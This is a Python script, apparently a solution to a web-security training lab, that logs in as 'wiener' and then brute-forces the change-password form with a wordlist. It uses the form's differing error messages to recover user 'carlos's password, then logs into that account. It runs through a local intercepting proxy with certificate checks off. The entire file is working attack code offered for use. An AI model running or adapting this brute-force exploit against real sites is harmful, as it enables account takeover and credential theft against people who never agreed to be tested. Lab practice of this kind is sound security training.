import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def password_brute_force(url, session, wordlist="/home/kali/passwords.txt"):
    change_url = url + "/my-account/change-password"
    found = False
    login(url, session)
    for password in open(wordlist):
        print("[*] Checking password : %s ..." % password.strip())
        data = {"username": "carlos", "current-password": password.strip(), "new-password-1": "peter",
                "new-password-2": "peter2"}
        response = session.post(url=change_url,
                                proxies=proxy,
                                data=data,
                                verify=False

                                )
        if "Current password is incorrect" not in response.text:
            print("[*] A valid password was found -> %s" % password)
            print("[*] Now trying to log in into Carlos's account")
            login_response = login(url, session, "carlos", password)
            if not "Invalid username or password" in login_response.text and login_response.status_code == 200:
                print("[*] Login Successful")
            else:
                print("[*] Login Failed")
                print("[*] Exploit Failed :((")

            found = True
            break
    if not found:
        print("[*] No valid password was found within the given worldist")
        print("[*] Exploit Failed :((")


def login(url, session, username="wiener", password="peter"):
    login_data = {"username": username, "password": password.strip()}
    login_url = url + "/login"
    login_response = session.post(url=login_url,
                                  data=login_data,
                                  proxies=proxy,
                                  verify=False)
    if "Invalid username or password." not in login_response.text and login_response.status_code == 200:
        return login_response
    else:
        print("[*] Login Failed")
        sys.exit(-1)


def main():
    if 2 > len(sys.argv) > 3:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url> <password_wordlist>")
        print(f"[*] Example {sys.argv[0]} https://example.com  passwords.txt")
        sys.exit(-1)
    else:
        session = requests.Session()
        if len(sys.argv) == 3:
            password_brute_force(sys.argv[1], session, sys.argv[2])
        else:
            password_brute_force(sys.argv[1], session)


if __name__ == "__main__":
    main()
